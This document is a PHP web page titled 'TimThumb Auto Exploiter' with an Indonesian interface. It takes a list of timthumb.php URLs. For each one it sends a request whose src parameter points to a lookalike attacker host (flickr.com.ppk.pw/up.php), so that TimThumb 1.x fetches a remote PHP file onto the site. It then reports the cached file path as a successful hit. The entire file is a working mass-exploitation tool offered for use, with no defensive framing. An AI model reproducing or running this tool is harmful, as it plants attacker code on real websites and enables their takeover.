<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
<title>[+] AutoExploiter TimThumb [+]</title>
<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
</head>
<body bgcolor="#1e1e1e" text="white">
<style>
  @import url('https://fonts.googleapis.com/css?family=Staatliches');

textarea {
max-width: 90%;
width: 500px;
height: 150px;
resize: none;
outline: none;
overflow: auto;
background: transparent;
color: #ffffff;
}

button {
  background: transparent;
    font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

input {
  background: transparent;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

font {
  font-family: Staatliches;
}

body::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

body::-webkit-scrollbar-track {
  background: #1e1e1e;        /* color of the tracking area */
}

body::-webkit-scrollbar-thumb {
  background-color: #1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}
.asu {
  font-family: Courier;
}
</style>
<center>
<font face=courier new size=5><b>TimThumb Auto Exploiter</b><br>
<font size=3>Exploiter Untuk TimThumb Versi 1.x</font><hr>
<form action="" method="POST">
<textarea rows=1 name="url" placeholder="http://situs.co.li/timthumb.php" ></textarea><br><br>
<input style="width: 300px;" type="submit" name="dor" value="Exploit">
</form>
<?php

function send($url){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$output = curl_exec($ch);
	curl_close($ch);
	return $output;
}

$url = $_POST['url'];
$explode = explode("\r\n",$url);
if($_POST['dor']){
foreach($explode as $site){
	echo "<hr>";
	$data = send($site."?src=http://flickr.com.ppk.pw/up.php");
	
	if(preg_match("/Unable to open image/",$data)){
$datas = explode("Unable to open image :",$data);
$pec = explode("<br />",$datas[1]);
echo "<font class=asu face=courier size=1>-:- Scan : $site <br>";
echo "<font class=asu face=courier size=1>-:- Result : <font color=green face=courier>".$pec[0]."</font><br>";
} else {
	echo "<font class=asu face=courier size=1>-:- Scan : $site <br>";
	echo "<font class=asu face=courier size=1>-:- Result : <font color=red face=courier size=1>Not Vuln !!</font><br>";
}

}
}
?>
<hr><font size="3">Unknown45 - 2021</font>
